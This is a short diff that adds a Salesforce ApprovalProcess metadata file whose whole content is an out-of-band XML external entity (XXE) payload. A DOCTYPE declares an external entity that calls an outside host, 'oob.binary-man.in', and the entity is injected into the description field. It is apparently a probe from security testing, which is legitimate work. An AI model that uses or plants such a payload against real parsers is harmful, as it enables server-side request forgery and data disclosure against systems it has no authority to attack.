@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [ <!ENTITY gsx SYSTEM "https://oob.binary-man.in/xxewide/approvalprocess"> ]>
+<ApprovalProcess xmlns="http://soap.sforce.com/2006/04/metadata"><active>false</active><description>&gsx;</description><label>GsXxeAp</label></ApprovalProcess>
